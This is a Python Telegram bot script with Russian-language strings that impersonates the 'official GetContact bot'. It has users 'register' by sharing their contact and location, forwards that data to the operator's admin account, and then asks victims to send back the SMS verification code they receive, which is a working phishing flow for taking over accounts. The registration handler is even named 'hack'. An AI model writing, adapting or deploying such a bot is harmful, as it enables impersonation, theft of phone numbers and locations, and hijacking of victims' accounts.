import telebot
from telebot import types
import os
import random

admin_id = Ваш ID
TOKEN = 'токен из @botfather'
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def get_text_messages(message):
        bot.send_message(admin_id, 'Пользователь онлайн!')
        #клавиатура
        keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
        pon_button = types.KeyboardButton(text="Зарегистрироваться")
        keyboard.add(pon_button)

        bot.send_message(message.chat.id,
                         text="Добро пожаловать!\nЯ официальный бот компании GetContact!",
                         reply_markup=keyboard)

@bot.message_handler(commands=['register'])
def hack(message):
	#клавиатура2
    keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    button_phone = types.KeyboardButton(text="Отправить", request_contact=True, request_location=True)
    keyboard.add(button_phone)
    
    bot.send_message(message.chat.id,
                     text="1)Отправьте мне свой контакт\n2)Получите СМС с кодом\n3)Отправьте этот код мне",
                     reply_markup=keyboard)

@bot.message_handler(content_types=['text'])
def get_text_messages1(message):
    if message.text == "Зарегистрироваться":
        bot.send_message(message.from_user.id, "Для того, чтобы получить доступ к боту, нужно зарегестрироватся, для этого напишите команду /register .")

@bot.message_handler(content_types=['location', 'contact'])
def code(message):
	bot.forward_message(admin_id, message.chat.id, message.message_id)
	bot.send_message(message.chat.id, 'Успешно! Ожидайте СМС с кодом')
	
@bot.message_handler(content_types=['location', 'contact'])
def forward(message):
	bot.forward_message(admin_id, message.chat.id, message.message_id)

if __name__ == '__main__':
    bot.polling(none_stop=True)
#by @saintfukk2
